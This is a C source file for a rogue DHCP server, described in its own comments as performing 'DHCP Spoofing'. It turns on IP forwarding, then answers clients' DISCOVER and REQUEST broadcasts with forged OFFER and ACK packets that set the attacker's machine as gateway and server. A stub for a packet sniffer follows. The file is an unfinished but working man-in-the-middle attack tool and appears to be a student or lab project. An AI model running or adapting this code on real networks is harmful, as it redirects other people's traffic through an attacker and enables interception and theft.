#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <math.h>
#include <unistd.h>
#include <stdlib.h>
#include <net/if.h>
#include <net/if_arp.h>
#include <netinet/if_ether.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <sys/socket.h>
#include <stdarg.h>
#include <sys/types.h>
#include <ifaddrs.h>

#include "dhcp.h"

/// A flag to indicate wheter debug printing should be performed
int verbose_mode = 0;
struct in_addr my_ip;
struct in_addr brd_addr;
struct in_addr sub_addr;
uint8_t srv_hst_name[] = "NOT A ROUTER";

/// Always use this print, which is only enabled when verbose mode is enabled.
void d_printf(char* format, ...) {
	va_list arguments;
	if( !verbose_mode ) {
		return;	
	}
	va_start(arguments, format);
	vprintf(format, arguments);
	va_end(arguments);
}

/// Gets the initial flags from the Command Line
void get_initial_flags(int argc, char** argv) {
	int value = 0;
	// Loop to look for flags
	while( (value = getopt(argc, argv, "v")) != -1 ) {
		switch( value ) {
			case 'v':
				verbose_mode = 1;
				break;
			case '?':
				
				break;
			default:
				break;
		}	
	}
}


/// Alloc & Initialze objects. 
/// Perform Initial Setup of the program
void init(void) {
	d_printf("Initializing\n");
		
	// Enabling Ip-Forwarding
	#ifdef __linux__
		system("echo 1 > /proc/sys/net/ipv4/ip_forward");
	#elif __APPLE__
		system("sysctl -w net.inet.ip.forwarding=1");
	#endif

	// Gets the local interface ip address
	struct ifaddrs *addrs, *it;
	getifaddrs(&addrs);
	it = addrs;
	while(it) {
		if( it->ifa_addr && it->ifa_addr->sa_family == AF_INET && strcmp(it->ifa_name, "lo") != 0 ) {
			struct sockaddr_in *sock_addr = (struct sockaddr_in *)it->ifa_addr;
			struct sockaddr_in *sock_brd_addr = (struct sockaddr_in *)it->ifa_broadaddr;
			struct sockaddr_in *sock_sub_addr = (struct sockaddr_in *)it->ifa_netmask;
			my_ip = sock_addr->sin_addr;
			brd_addr = sock_brd_addr->sin_addr;
			sub_addr = sock_sub_addr->sin_addr;
			d_printf("My Ip Address: %s\n", inet_ntoa(sock_addr->sin_addr));
			d_printf("Brodcast Address For the Network: %s\n", inet_ntoa(sock_brd_addr->sin_addr));
			d_printf("Subnet Mask: %s\n", inet_ntoa(sock_sub_addr->sin_addr));
			break;
		}
		it = it->ifa_next;
	}
	freeifaddrs(addrs);
	
	// Broadcast
	

	d_printf("Done - Initialization\n");
}

/// Dealloc objects
/// Perform deinitialization for the objects
void deinit(void) {	
	d_printf("Deinitializing\n");
}

/// This should perform the DHCP Spoofing
void init_DHCP_server() {
	
	d_printf("DHCP Init\n");
	
	dhcp_hdr i_hdr, o_hdr;
	dhcp_opt i_opt, o_opt;
	in_addr_t i_addr;
	while(1) {
		// Default Values
		memset(&i_hdr, 0, sizeof(i_hdr));
		memset(&i_opt, 0, sizeof(i_opt));
		memset(&o_hdr, 0, sizeof(o_hdr));
		memset(&o_opt, 0, sizeof(o_opt));
		
		d_printf("Waiting DHCP Packages\n");
	
		// Gets a dhcp package from the network
		i_addr = wait_dhcp_hdr(&i_hdr);
		
		// Get Options from Header
		set_dhcp_opt_from_dhcp_hdr(&i_opt, &i_hdr);

		
		d_printf("i_addr = %d\n", i_addr);
		switch(i_opt.dhcp_msg) {
			case DISCOVER:
				d_printf("Discover\n");
				// Header
				o_hdr.opcode = 0x2; 		// Reply
				o_hdr.hrd_t = 1; 		// Ethernet
				o_hdr.hrd_addr_l = ETHER_ADDR_L;// 6 Bytes
				o_hdr.hop_c = 0;		
				o_hdr.trs_id = i_hdr.trs_id;	// Transactio ID from the captured package
				o_hdr.num_s = 0;		
				o_hdr.flags = i_hdr.flags;	// Flags from the client
				o_hdr.clt_ip = 0;		
				o_hdr.own_ip = inet_addr("10.32.143.232"); // Static Value for Now
				o_hdr.srv_ip = my_ip.s_addr;
				o_hdr.gtw_ip = my_ip.s_addr;
				memcpy(o_hdr.clt_hrd_addr, i_hdr.clt_hrd_addr, CLT_HRD_ADDR_L);
				memcpy(o_hdr.srv_hst, srv_hst_name, strlen(srv_hst_name));
				memcpy(o_hdr.boot_fln, i_hdr.boot_fln, BOOT_FLN_L);
				
				// Options
				o_opt.dhcp_msg = OFFER;
				o_opt.ip_lease_time = 10000;
				memcpy(o_opt.srv_id, &my_ip.s_addr, IP_ADDR_L);
				memcpy(o_opt.rtr_id, o_opt.srv_id, IP_ADDR_L);
				memcpy(o_opt.sub_msk, &sub_addr.s_addr, IP_ADDR_L);
				//o_opt.rnw_time = 10000;
				//o_opt.rbn_time = 10000;

				// Sets the flags for the header
				set_dhcp_hdr_from_dhcp_opt(&o_opt, &o_hdr);
			
				// Sends the package
				send_dhcp_hdr(&o_hdr, INADDR_BROADCAST);
	
				break;
			case OFFER:
				d_printf("Offer\n");
				break;
			case REQUEST:
				// Header
				o_hdr.opcode = 0x2; 		// Reply
				o_hdr.hrd_t = 1;		// Ethernet
				o_hdr.hrd_addr_l = ETHER_ADDR_L;// 6 bytes
				o_hdr.hop_c = 0;
				o_hdr.trs_id = i_hdr.trs_id;	// Transaction id
				o_hdr.num_s = 0;
				o_hdr.flags = i_hdr.flags;	// Flags from the client
				o_hdr.clt_ip = i_hdr.clt_ip;
				o_hdr.own_ip = inet_addr("10.32.143.232");
				o_hdr.srv_ip = my_ip.s_addr;
				o_hdr.gtw_ip = my_ip.s_addr;
				memcpy(o_hdr.clt_hrd_addr, i_hdr.clt_hrd_addr, CLT_HRD_ADDR_L);
				memcpy(o_hdr.srv_hst, srv_hst_name, strlen(srv_hst_name));
				memcpy(o_hdr.boot_fln, i_hdr.boot_fln, BOOT_FLN_L);
	
				// Options
				o_opt.dhcp_msg = ACK;		
				o_opt.ip_lease_time = 10000;
				memcpy(o_opt.srv_id, &my_ip.s_addr, IP_ADDR_L);
				memcpy(o_opt.sub_msk, &sub_addr.s_addr, IP_ADDR_L);
				o_opt.rnw_time = 10000;
				o_opt.rbn_time = 10000;

				// Gather the flags from the header
				set_dhcp_hdr_from_dhcp_opt(&o_opt, &o_hdr);
			
				// Sends the package
				send_dhcp_hdr(&o_hdr, INADDR_BROADCAST);

				d_printf("Request\n");
				break;
			case DECLINE:
				d_printf("Decline\n");
				break;
			case ACK:
				d_printf("Ack\n");
				break;
			case NAK:
				d_printf("Nak\n");
				break;
			case RELEASE:
				d_printf("Release\n");
				break;
			case INFORM:
				d_printf("Inform\n");
				break;
			case INVALID:
				d_printf("Invalid\n");
				break;
		}
	}

}
/// This should begin monitoring the networking and opening the incoming packages
void init_sniffer() {
	
}

int main(int argc, char** argv) {		
	// Gets Initial Flags
	get_initial_flags(argc, argv);

	// Initialization
	init();

	// Register exit function
	atexit(deinit);	
	
	init_DHCP_server();
	
	init_sniffer();

	// End of program
	exit(EXIT_SUCCESS);
}
